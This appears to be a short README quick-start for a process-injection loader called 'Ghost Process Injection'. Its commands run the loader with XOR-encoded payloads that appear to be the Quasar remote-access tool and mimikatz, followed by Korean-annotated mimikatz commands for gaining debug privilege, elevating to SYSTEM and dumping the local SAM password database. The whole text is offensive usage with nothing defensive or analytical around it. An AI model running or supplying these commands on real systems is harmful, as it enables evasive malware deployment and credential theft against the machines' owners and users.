# Ghost Process Injection
## Quick Start

### Quasar
.\new_x64_netghost.exe --vxor .\cb.vxor 5A1F3C7E
### mimikatz
.\new_x64_netghost.exe --vxor .\mimi.vxor 5A1F3C7E

privilege::debug 디버그 권한 휙득

token::elevate System 권한 휙득

lsadump::sam : 로컬 계정 암호 데이터베이스(SAM) 덤프
